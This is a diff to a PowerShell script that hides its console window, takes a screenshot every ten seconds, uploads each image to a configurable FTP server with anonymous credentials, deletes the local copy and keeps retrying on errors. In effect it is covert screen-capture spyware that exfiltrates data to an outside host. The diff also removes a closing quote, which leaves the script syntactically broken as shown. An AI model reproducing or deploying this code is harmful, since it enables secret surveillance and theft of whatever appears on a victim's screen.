@@ -1,3 +1,6 @@
+$FTP-server-address = "" # works with an IP or web address es.192.168.1.1 or test.randomdomain.com
+
+
 # .Net methods for hiding/showing the console in the background
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
@@ -5,7 +8,6 @@ public static extern IntPtr GetConsoleWindow();
 
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
 
 function Hide-Console
 {
@@ -14,20 +16,19 @@ function Hide-Console
     [Console.Window]::ShowWindow($consolePtr, 0)
 }
 
- Hide-Console
+Hide-Console
 
 
 function FTP-send
 {
 
-
 # create the FtpWebRequest and configure it
-$ftp = [System.Net.FtpWebRequest]::Create("ftp://[ADDRESS]/" + $timestamp +".png")
+$ftp = [System.Net.FtpWebRequest]::Create("ftp://" + $FTP-server-address + "/" + $timestamp +".png")
 $ftp = [System.Net.FtpWebRequest]$ftp
 $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
 $ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","anonymous@localhost")
 $ftp.UseBinary = $true
-$ftp.UsePassive = $false # before was true
+$ftp.UsePassive = $false # enable / disable passive mode
 # read in the file to upload as a byte array
 $content = [System.IO.File]::ReadAllBytes($File)
 $ftp.ContentLength = $content.Length
@@ -35,12 +36,9 @@ $ftp.ContentLength = $content.Length
 $rs = $ftp.GetRequestStream()
 $rs.Write($content, 0, $content.Length)
 # be sure to clean up after ourselves
-echo "Sent"
+echo $timestamp + " - Sent"
 $rs.Close()
 $rs.Dispose()
-
-
-
 }
 
 
@@ -48,7 +46,6 @@ $count = 0
 while($true){
 
 try {
-# seconds to pass before the next iteration occours
  
 
 # file path
@@ -80,15 +77,18 @@ $bitmap.Save($File)
 Write-Output "Screenshot saved to:"
 Write-Output $File
 
+# send the file
 FTP-send
 
+# remove the file
 Remove-Item $File
+# seconds to pass before the next iteration occours
 Start-Sleep -seconds 10;
 
 } catch {
-echo "something wrong"
+Write-Output "Cannot connect to the FTP server + every other possible error"
+# sleep one minute and try again
 Start-Sleep -seconds 60; 
-
 }
 
 }
